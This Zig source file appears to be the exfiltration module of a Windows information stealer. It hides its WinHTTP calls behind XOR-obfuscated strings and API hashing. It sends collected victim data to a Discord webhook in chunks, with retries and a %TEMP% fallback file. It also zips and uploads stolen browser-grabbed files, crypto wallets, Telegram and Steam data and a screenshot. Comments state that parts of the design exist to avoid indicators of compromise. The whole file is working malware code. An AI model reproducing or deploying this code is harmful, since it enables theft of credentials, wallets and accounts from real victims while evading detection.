const std = @import("std");
const furtivo = @import("furtivo.zig");
const obf = @import("obf.zig");
const coleta = @import("coleta.zig");
const winfs = @import("winfs.zig");
const direto = @import("direto/direto.zig");
const json = @import("json.zig");

const WinHttpOpenFn = *const fn (pwszUserAgent: ?[*:0]const u16, dwAccessType: u32, pwszProxyName: ?[*:0]const u16, pwszProxyBypass: ?[*:0]const u16, dwFlags: u32) callconv(.winapi) ?*anyopaque;
const WinHttpConnectFn = *const fn (hSession: ?*anyopaque, pswzServerName: [*:0]const u16, nServerPort: u16, dwReserved: u32) callconv(.winapi) ?*anyopaque;
const WinHttpOpenRequestFn = *const fn (hConnect: ?*anyopaque, pwszVerb: [*:0]const u16, pwszObjectName: [*:0]const u16, pwszVersion: ?[*:0]const u16, pwszReferrer: ?[*:0]const u16, ppwszAcceptTypes: ?*?[*:0]const u16, dwFlags: u32) callconv(.winapi) ?*anyopaque;
const WinHttpSendRequestFn = *const fn (hRequest: ?*anyopaque, lpszHeaders: ?[*:0]const u16, dwHeadersLength: u32, lpOptional: ?*const anyopaque, dwOptionalLength: u32, dwTotalLength: u32, dwContext: usize) callconv(.winapi) c_int;
const WinHttpReceiveResponseFn = *const fn (hRequest: ?*anyopaque, lpReserved: ?*anyopaque) callconv(.winapi) c_int;
const WinHttpReadDataFn = *const fn (hRequest: ?*anyopaque, lpBuffer: [*]u8, dwNumberOfBytesToRead: u32, lpdwNumberOfBytesRead: *u32) callconv(.winapi) c_int;
const WinHttpCloseHandleFn = *const fn (hInternet: ?*anyopaque) callconv(.winapi) c_int;

fn toUtf16Z(allocator: std.mem.Allocator, str: []const u8) ![:0]u16 {
    return try std.unicode.utf8ToUtf16LeAllocZ(allocator, str);
}

fn resolveWinHttp() ?struct {
    Open: WinHttpOpenFn,
    Connect: WinHttpConnectFn,
    OpenRequest: WinHttpOpenRequestFn,
    SendRequest: WinHttpSendRequestFn,
    ReceiveResponse: WinHttpReceiveResponseFn,
    ReadData: WinHttpReadDataFn,
    CloseHandle: WinHttpCloseHandleFn,
} {
    const winhttp = furtivo.getModuleHandle(&comptime obf.xorStr("winhttp.dll"));
    if (winhttp == 0) return null;

    const Open = @as(?WinHttpOpenFn, @ptrFromInt(obf.getProcAddressByHash(winhttp, comptime obf.apiHash("WinHttpOpen")) catch 0)) orelse return null;
    const Connect = @as(?WinHttpConnectFn, @ptrFromInt(obf.getProcAddressByHash(winhttp, comptime obf.apiHash("WinHttpConnect")) catch 0)) orelse return null;
    const OpenRequest = @as(?WinHttpOpenRequestFn, @ptrFromInt(obf.getProcAddressByHash(winhttp, comptime obf.apiHash("WinHttpOpenRequest")) catch 0)) orelse return null;
    const SendRequest = @as(?WinHttpSendRequestFn, @ptrFromInt(obf.getProcAddressByHash(winhttp, comptime obf.apiHash("WinHttpSendRequest")) catch 0)) orelse return null;
    const ReceiveResponse = @as(?WinHttpReceiveResponseFn, @ptrFromInt(obf.getProcAddressByHash(winhttp, comptime obf.apiHash("WinHttpReceiveResponse")) catch 0)) orelse return null;
    const ReadData = @as(?WinHttpReadDataFn, @ptrFromInt(obf.getProcAddressByHash(winhttp, comptime obf.apiHash("WinHttpReadData")) catch 0)) orelse return null;
    const CloseHandle = @as(?WinHttpCloseHandleFn, @ptrFromInt(obf.getProcAddressByHash(winhttp, comptime obf.apiHash("WinHttpCloseHandle")) catch 0)) orelse return null;

    return .{
        .Open = Open,
        .Connect = Connect,
        .OpenRequest = OpenRequest,
        .SendRequest = SendRequest,
        .ReceiveResponse = ReceiveResponse,
        .ReadData = ReadData,
        .CloseHandle = CloseHandle,
    };
}

pub fn sendRequest(allocator: std.mem.Allocator, host: []const u8, path: []const u8, data: []const u8) !void {
    const api = resolveWinHttp() orelse return error.WinHttpNotFound;

    const host_w = try toUtf16Z(allocator, host);
    defer allocator.free(host_w);
    const path_w = try toUtf16Z(allocator, path);
    defer allocator.free(path_w);
    const method_w = try toUtf16Z(allocator, "POST");
    defer allocator.free(method_w);
    const headers_w = try toUtf16Z(allocator, "Content-Type: application/json\r\n");
    defer allocator.free(headers_w);

    const hSession = api.Open(null, 0, null, null, 0);
    if (hSession == null) return error.WinHttpOpenFailed;
    defer _ = api.CloseHandle(hSession);

    const hConnect = api.Connect(hSession, host_w.ptr, 443, 0);
    if (hConnect == null) return error.WinHttpConnectFailed;
    defer _ = api.CloseHandle(hConnect);

    const hRequest = api.OpenRequest(hConnect, method_w.ptr, path_w.ptr, null, null, null, 0x00800000);
    if (hRequest == null) return error.WinHttpOpenRequestFailed;
    defer _ = api.CloseHandle(hRequest);

    if (api.SendRequest(hRequest, headers_w.ptr, @intCast(headers_w.len), data.ptr, @intCast(data.len), @intCast(data.len), 0) == 0) {
        return error.WinHttpSendRequestFailed;
    }

    _ = api.ReceiveResponse(hRequest, null);
}

// Send a GET request and return the response body as allocated text.
pub fn sendGetRequest(allocator: std.mem.Allocator, host: []const u8, path: []const u8) ![]u8 {
    const api = resolveWinHttp() orelse return error.WinHttpNotFound;

    const host_w = try toUtf16Z(allocator, host);
    defer allocator.free(host_w);
    const path_w = try toUtf16Z(allocator, path);
    defer allocator.free(path_w);
    const method_w = try toUtf16Z(allocator, "GET");
    defer allocator.free(method_w);

    const hSession = api.Open(null, 0, null, null, 0);
    if (hSession == null) return error.WinHttpOpenFailed;
    defer _ = api.CloseHandle(hSession);

    const hConnect = api.Connect(hSession, host_w.ptr, 443, 0);
    if (hConnect == null) return error.WinHttpConnectFailed;
    defer _ = api.CloseHandle(hConnect);

    const hRequest = api.OpenRequest(hConnect, method_w.ptr, path_w.ptr, null, null, null, 0x00800000);
    if (hRequest == null) return error.WinHttpOpenRequestFailed;
    defer _ = api.CloseHandle(hRequest);

    if (api.SendRequest(hRequest, null, 0, null, 0, 0, 0) == 0) {
        return error.WinHttpSendRequestFailed;
    }

    if (api.ReceiveResponse(hRequest, null) == 0) {
        return error.WinHttpReceiveResponseFailed;
    }

    var body: std.ArrayList(u8) = .empty;
    defer body.deinit(allocator);

    var buf: [4096]u8 = undefined;
    var bytes_read: u32 = 0;
    while (true) {
        if (api.ReadData(hRequest, &buf, @intCast(buf.len), &bytes_read) == 0) break;
        if (bytes_read == 0) break;
        try body.appendSlice(allocator, buf[0..bytes_read]);
    }

    return body.toOwnedSlice(allocator);
}

// Retry wrapper: attempts sendRequest up to 3 times with 2-second delays.
// On final failure, writes the payload to %TEMP%\pipeta_fallback.json as local fallback.
pub fn sendRequestRetry(allocator: std.mem.Allocator, host: []const u8, path: []const u8, data: []const u8) void {
    var attempt: u32 = 0;
    const max_attempts: u32 = 3;

    while (attempt < max_attempts) : (attempt += 1) {
        if (sendRequest(allocator, host, path, data)) |_| {
            return; // Success
        } else |_| {
            // Failed this attempt
            if (attempt + 1 < max_attempts) {
                // 2-second delay before next retry using NtDelayExecution
                direto.ntDelayExecution(2000);
            }
        }
    }

    // All attempts failed: write payload to fallback file
    writeFallback(allocator, data);
}

// Write payload to %TEMP%\pipeta_fallback.json as local fallback on exfil failure.
fn writeFallback(allocator: std.mem.Allocator, data: []const u8) void {
    const temp = furtivo.getEnvVar(allocator, "TEMP") catch return;
    defer allocator.free(temp);

    const fallback_path = std.fmt.allocPrint(allocator, "{s}\\pipeta_fallback.json", .{temp}) catch return;
    defer allocator.free(fallback_path);

    // Use winfs to write the file
    const CreateFileWFn = *const fn ([*:0]const u16, u32, u32, ?*anyopaque, u32, u32, ?*anyopaque) callconv(.winapi) ?*anyopaque;
    const WriteFileFn = *const fn (?*anyopaque, [*]const u8, u32, *u32, ?*anyopaque) callconv(.winapi) i32;
    const CloseHandleFn = *const fn (?*anyopaque) callconv(.winapi) i32;

    const k32_mod = &comptime obf.xorStr("kernel32.dll");
    const CreateFileW = @as(?CreateFileWFn, @ptrFromInt(blk: {
        const h = furtivo.getModuleHandle(k32_mod);
        if (h == 0) break :blk 0;
        break :blk obf.getProcAddressByHash(h, comptime obf.apiHash("CreateFileW")) catch 0;
    })) orelse return;
    const WriteFile_ = @as(?WriteFileFn, @ptrFromInt(blk: {
        const h = furtivo.getModuleHandle(k32_mod);
        if (h == 0) break :blk 0;
        break :blk obf.getProcAddressByHash(h, comptime obf.apiHash("WriteFile")) catch 0;
    })) orelse return;
    const CloseHandle = @as(?CloseHandleFn, @ptrFromInt(blk: {
        const h = furtivo.getModuleHandle(k32_mod);
        if (h == 0) break :blk 0;
        break :blk obf.getProcAddressByHash(h, comptime obf.apiHash("CloseHandle")) catch 0;
    })) orelse return;

    const GENERIC_WRITE: u32 = 0x40000000;
    const CREATE_ALWAYS: u32 = 2;
    const FILE_ATTRIBUTE_NORMAL: u32 = 0x80;

    const path_w = std.unicode.utf8ToUtf16LeAllocZ(allocator, fallback_path) catch return;
    defer allocator.free(path_w);

    const handle = CreateFileW(path_w, GENERIC_WRITE, 0, null, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, null) orelse return;
    defer _ = CloseHandle(handle);

    var bytes_written: u32 = 0;
    var offset: usize = 0;
    while (offset < data.len) {
        const chunk_len: u32 = @intCast(@min(data.len - offset, @as(usize, 0x7FFFFFFF)));
        if (WriteFile_(handle, data.ptr + offset, chunk_len, &bytes_written, null) == 0) break;
        if (bytes_written == 0) break;
        offset += bytes_written;
    }
}

pub fn exfilDiscord(allocator: std.mem.Allocator, webhook_host: []const u8, webhook_path: []const u8, content: []const u8) !void {
    const body = try std.fmt.allocPrint(allocator, "{{\"content\": \"{s}\"}}", .{content});
    defer allocator.free(body);
    try sendRequest(allocator, webhook_host, webhook_path, body);
}

fn exfilChunkedEscaped(allocator: std.mem.Allocator, host: []const u8, path: []const u8, escaped: []const u8, chunk_size: usize) void {
    if (escaped.len == 0) return;

    var start: usize = 0;
    while (start < escaped.len) {
        const limit = @min(start + chunk_size, escaped.len);
        var cut = json.safeCut(escaped, start, limit);
        if (cut <= start) cut = limit; // fallback: never stall
        const piece = escaped[start..cut];

        const msg = std.fmt.allocPrint(allocator, "{{\"content\": \"```json\\n{s}\\n```\"}}", .{piece}) catch break;
        defer allocator.free(msg);

        sendRequestRetry(allocator, host, path, msg);
        start = cut;
    }
}

pub fn exfil(allocator: std.mem.Allocator, col: *coleta.Coleta, host: []const u8, path: []const u8) void {
    const payload = col.toJson() catch return;
    defer allocator.free(payload);

    const escaped = json.escape(allocator, payload) catch return;
    defer allocator.free(escaped);

    // Discord webhook `content` cap is 2000 characters. The wrapper adds 29
    // characters around the piece, so only send a single message when it fits.
    const max_single: usize = 1900;
    if (escaped.len <= max_single) {
        const wrapped = std.fmt.allocPrint(allocator, "{{\"content\": \"{s}\"}}", .{escaped}) catch return;
        defer allocator.free(wrapped);
        sendRequestRetry(allocator, host, path, wrapped);
        return;
    }

    exfilChunkedEscaped(allocator, host, path, escaped, 1800);
}

/// Generate a random multipart boundary at runtime using GetTickCount.
/// Format: "----pipeta<16_hex_chars>----"
/// This avoids the static boundary string IOC.
fn genBoundary(buf: *[32]u8) []const u8 {
    // Resolve GetTickCount from kernel32
    const k32 = furtivo.getModuleHandle(&comptime obf.xorStr("kernel32.dll"));
    var tick: u32 = 0;
    if (k32 != 0) {
        const gtc_addr = obf.getProcAddressByHash(k32, comptime obf.apiHash("GetTickCount")) catch 0;
        if (gtc_addr != 0) {
            const GetTickCount = @as(*const fn () callconv(.winapi) u32, @ptrFromInt(gtc_addr));
            tick = GetTickCount();
        }
    }

    // Derive 16 pseudo-random hex chars from tick via simple arithmetic
    // Use multiplication and XOR mixing to spread bits
    var vals: [4]u32 = .{ tick, tick ^ 0xDEADBEEF, tick *% 0x9E3779B9, tick +% 0xCAFEBABE };
    const hex_chars = "0123456789abcdef";

    // Write: "----pipeta" (10 chars) + 16 hex chars + "----" (4 chars) = 30 chars total
    const prefix = "----pipeta";
    @memcpy(buf[0..prefix.len], prefix);

    var pos: usize = prefix.len;
    for (vals[0..4]) |v| {
        // Extract 4 hex chars from each u32
        inline for (0..4) |j| {
            const shift_amt: u5 = @intCast((3 - j) * 4);
            const nibble: u8 = @intCast((v >> shift_amt) & 0xF);
            buf[pos] = hex_chars[nibble];
            pos += 1;
        }
    }

    const suffix = "----";
    @memcpy(buf[pos .. pos + suffix.len], suffix);

    return buf[0 .. pos + suffix.len];
}

// Multipart form-data file upload (Discord webhook supports up to 25MB)
pub fn uploadFile(
    allocator: std.mem.Allocator,
    host: []const u8,
    path: []const u8,
    filename: []const u8,
    filedata: []const u8,
    json_payload: []const u8,
) void {
    const api = resolveWinHttp() orelse return;

    // Generate random boundary at runtime to avoid static IOC
    var boundary_buf: [32]u8 = undefined;
    const boundary = genBoundary(&boundary_buf);

    const host_w = toUtf16Z(allocator, host) catch return;
    defer allocator.free(host_w);
    const path_w = toUtf16Z(allocator, path) catch return;
    defer allocator.free(path_w);
    const method_w = toUtf16Z(allocator, "POST") catch return;
    defer allocator.free(method_w);

    // Build multipart body
    var body: std.ArrayList(u8) = .empty;
    defer body.deinit(allocator);

    // JSON payload field (payload_json)
    body.appendSlice(allocator, "--") catch return;
    body.appendSlice(allocator, boundary) catch return;
    body.appendSlice(allocator, "\r\nContent-Disposition: form-data; name=\"payload_json\"\r\nContent-Type: application/json\r\n\r\n") catch return;
    body.appendSlice(allocator, json_payload) catch return;
    body.appendSlice(allocator, "\r\n") catch return;

    // File field
    body.appendSlice(allocator, "--") catch return;
    body.appendSlice(allocator, boundary) catch return;
    body.appendSlice(allocator, "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"") catch return;
    body.appendSlice(allocator, filename) catch return;
    body.appendSlice(allocator, "\"\r\nContent-Type: application/octet-stream\r\n\r\n") catch return;
    body.appendSlice(allocator, filedata) catch return;
    body.appendSlice(allocator, "\r\n") catch return;

    // Closing boundary
    body.appendSlice(allocator, "--") catch return;
    body.appendSlice(allocator, boundary) catch return;
    body.appendSlice(allocator, "--\r\n") catch return;

    // Content-Type header
    const ct_header = std.fmt.allocPrint(allocator, "Content-Type: multipart/form-data; boundary={s}\r\n", .{boundary}) catch return;
    defer allocator.free(ct_header);
    const headers_w = toUtf16Z(allocator, ct_header) catch return;
    defer allocator.free(headers_w);

    const hSession = api.Open(null, 0, null, null, 0);
    if (hSession == null) return;
    defer _ = api.CloseHandle(hSession);

    const hConnect = api.Connect(hSession, host_w.ptr, 443, 0);
    if (hConnect == null) return;
    defer _ = api.CloseHandle(hConnect);

    const hRequest = api.OpenRequest(hConnect, method_w.ptr, path_w.ptr, null, null, null, 0x00800000);
    if (hRequest == null) return;
    defer _ = api.CloseHandle(hRequest);

    _ = api.SendRequest(hRequest, headers_w.ptr, @intCast(headers_w.len), body.items.ptr, @intCast(body.items.len), @intCast(body.items.len), 0);
    _ = api.ReceiveResponse(hRequest, null);
}

// Exfiltrate with file attachment: ZIPs all collected files and uploads
pub fn exfilWithFiles(
    allocator: std.mem.Allocator,
    col: *coleta.Coleta,
    host: []const u8,
    path: []const u8,
    files: []const coleta.ArquivoGrab,
) void {
    const zipper = @import("zipper.zig");

    // Send JSON data first (chunked if large)
    exfil(allocator, col, host, path);

    // Build ZIP with all grabbed files, wallets, telegram, steam, screenshot
    var zw = zipper.ZipWriter.init(allocator);
    defer zw.deinit();
    var has_data = false;

    for (files) |f| {
        const data = winfs.readFileAlloc(allocator, f.path, 10 * 1024 * 1024) catch continue;
        defer allocator.free(data);
        // Use basename as ZIP entry name
        const basename = std.fs.path.basename(f.path);
        zw.addFile(basename, data) catch {};
        has_data = true;
    }

    // Also add screenshot if it exists
    if (col.screenshot.path.len > 0) {
        const screen_data = winfs.readFileAlloc(allocator, col.screenshot.path, 50 * 1024 * 1024) catch "";
        if (screen_data.len > 0) {
            defer allocator.free(screen_data);
            zw.addFile("screenshot.bmp", screen_data) catch {};
            has_data = true;
        }
    }

    // Add wallet/telegram/steam temp directories from %TEMP%
    {
        const temp = furtivo.getEnvVar(allocator, "TEMP") catch "";
        defer if (temp.len > 0) allocator.free(temp);

        if (temp.len > 0) {
            if (col.wallets_ext.items.len > 0 or col.wallets_desk.items.len > 0) {
                const wallets_dir = std.fs.path.join(allocator, &[_][]const u8{ temp, "pipeta_wallets" }) catch "";
                if (wallets_dir.len > 0) {
                    defer allocator.free(wallets_dir);
                    zipper.addDirToZip(&zw, allocator, wallets_dir, "wallets_ext") catch {};
                    has_data = true;
                }
                const wallets_desk_dir = std.fs.path.join(allocator, &[_][]const u8{ temp, "pipeta_wallets_desk" }) catch "";
                if (wallets_desk_dir.len > 0) {
                    defer allocator.free(wallets_desk_dir);
                    zipper.addDirToZip(&zw, allocator, wallets_desk_dir, "wallets_desk") catch {};
                    has_data = true;
                }
            }

            // Telegram - check independently
            if (col.telegram_arquivos.items.len > 0) {
                const tdata_dir = std.fs.path.join(allocator, &[_][]const u8{ temp, "pipeta_tdata" }) catch "";
                if (tdata_dir.len > 0) {
                    defer allocator.free(tdata_dir);
                    zipper.addDirToZip(&zw, allocator, tdata_dir, "telegram") catch {};
                    has_data = true;
                }
            }

            // Steam - check independently
            if (col.steam_arquivos.items.len > 0) {
                const steam_dir = std.fs.path.join(allocator, &[_][]const u8{ temp, "pipeta_steam" }) catch "";
                if (steam_dir.len > 0) {
                    defer allocator.free(steam_dir);
                    zipper.addDirToZip(&zw, allocator, steam_dir, "steam") catch {};
                    has_data = true;
                }
            }
        }
    }

    if (!has_data) return;

    const zip_data = zw.finalize() catch return;
    defer allocator.free(zip_data);

    if (zip_data.len == 0) return;

    // Discord free tier: 25MB limit
    if (zip_data.len > 25 * 1024 * 1024) return;

    const json_meta = "{\"content\": \"Arquivos coletados\"}";
    uploadFile(allocator, host, path, "pipeta.zip", zip_data, json_meta);
}
